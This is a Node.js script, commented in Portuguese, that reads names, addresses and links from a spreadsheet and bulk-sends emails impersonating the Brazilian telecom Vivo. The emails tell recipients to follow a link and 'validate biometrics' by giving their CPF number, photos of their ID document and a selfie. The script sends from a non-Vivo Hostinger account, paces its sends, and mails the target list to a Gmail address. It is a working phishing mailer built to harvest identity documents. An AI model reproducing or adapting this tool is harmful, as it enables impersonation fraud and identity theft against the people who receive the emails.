const nodemailer = require('nodemailer');
const excel = require('exceljs');
const path = require('path');
const readline = require('readline');

// Credenciais de e-mail
const EMAIL_USER = '*************';
const EMAIL_PASS = '*************';

// Configura o transportador de e-mail
const transporter = nodemailer.createTransport({
  host: 'smtp.hostinger.com.br',
  port: 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS
  }
});

const main = async () => {
  try {
    // Importando inquirer dinamicamente
    const inquirer = (await import('inquirer')).default;

    const answers = await inquirer.prompt([
      {
        type: 'input',
        name: 'excelPath',
        message: 'Digite o caminho completo do arquivo "email.xlsx":'
      },
      {
        type: 'input',
        name: 'imagePath',
        message: 'Digite o caminho completo da imagem:'
      }
    ]);

    const excelPath = answers.excelPath;
    const imagePath = answers.imagePath;

    try {
      const workbook = new excel.Workbook();
      await workbook.xlsx.readFile(excelPath);
      const worksheet = workbook.getWorksheet(1);
      let emailCount = 0;

      const sendEmail = async (row, rowNumber) => {
        if (rowNumber === 1) return; // Pular o cabeçalho

        const nome = row.getCell(1).value; // A coluna A contém o nome
        const emailCellValue = row.getCell(2).value;
        const email = (emailCellValue && emailCellValue.hyperlink) || emailCellValue;
        const linkCellValue = row.getCell(3).value;
        const link = (linkCellValue && linkCellValue.hyperlink) || linkCellValue;

        if (!email) {
          console.error(`Erro ao enviar e-mail para ${nome} (${email}): Endereço de e-mail não definido`);
          return;
        }

        // Cria a mensagem
        const mensagem = `
        <img src="cid:imagem@cid">
          <div>
            <p>Olá <span style="color: pink; font-weight: bold;">${nome}</span>!</p>
            <p>Sua atualização VIVO está ativa em nosso sistema, mas precisamos da sua validação biométrica para garantir a segurança e proteção dos seus dados.</p>
            <p>A biometria é um processo importante que verifica sua identidade por meio de características únicas, como impressão digital e reconhecimento facial.</p>
            <p>Para validar sua biometria, siga o passo a passo abaixo:</p>
            <ol>
                <li>Insira seu CPF para acessar o processo de Biometria.</li>
                <li>Na tela de boas-vindas, você será informado sobre o processo e seu primeiro nome será exibido para confirmação.</li>
                <li>Será solicitada a captura de imagens do seu documento de identificação.</li>
                <li>As imagens capturadas serão analisadas para garantir a autenticidade.</li>
                <li>Em seguida, será necessário capturar uma selfie para comparação com a foto do documento enviado.</li>
                <li>Sua selfie será analisada e comparada à foto do documento para verificar a correspondência.</li>
                <li>Após a conclusão do processo de Biometria, entraremos em contato para informar sobre a validação bem-sucedida.</li>
            </ol>
            <p><a href="${link}">${link}</a></p>
            <p>Assim que concluir, entraremos em contato para informar!</p>
            <p>Atenciosamente, Vivo</p>
          </div>
          <br>
        `;

        // Configura a mensagem de e-mail
        const mailOptions = {
          from: EMAIL_USER, // sender address
          to: email, // list of receivers
          subject: 'Vivo - Veja as informações importantes da sua contratação', // Subject line
          html: mensagem, // HTML body
          attachments: [
            {
              filename: 'imagem.jpg',
              path: imagePath,
              cid: 'imagem@cid'
            }
          ]
        };


          // Envia o e-mail
          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error(`Erro ao enviar e-mail para ${nome} (${email}): ${error}`);
            } else {
              emailCount++;
              console.log(`E-mail enviado para ${nome} (${email}): ${info.response}`);
              console.log(`Total de e-mails enviados: ${emailCount}`);
            }
          });

           // Retorna uma promise que será resolvida após a pausa de 10 segundos
        return new Promise(resolve => setTimeout(resolve, 10000));
      };

      // Itera sobre cada linha da planilha
      for (let rowNumber = 1; rowNumber <= worksheet.rowCount; rowNumber++) {
        const row = worksheet.getRow(rowNumber);
        await sendEmail(row, rowNumber);
      }

        const currentDateTime = new Date();
        const formattedDateTime = currentDateTime.toLocaleString('pt-BR', { timeZone: 'UTC' });
        const formattedSubject = `Biometria (${formattedDateTime}) do envio`;

        const mailOptionsAttachment = {
          from: EMAIL_USER,
          to: 'andreajbtelecom.com@gmail.com',
          subject: formattedSubject,
          text: 'Segue a planilha com as biometrias enviadas.',
          attachments: [
            {
              filename: path.basename(excelPath),
              path: excelPath
            }
          ]
        };

        transporter.sendMail(mailOptionsAttachment, (error, info) => {
          if (error) {
            console.error(`Erro ao enviar a planilha por e-mail: ${error}`);
          } else {
            console.log(`Planilha enviada por e-mail: ${info.response}`);
          }
        });

      } catch (error) {
        console.error('Ocorreu um erro:', error.message);
      }
    } catch (error) {
      console.error('Ocorreu um erro no inquirer:', error.message);
    }
  };
  
  main();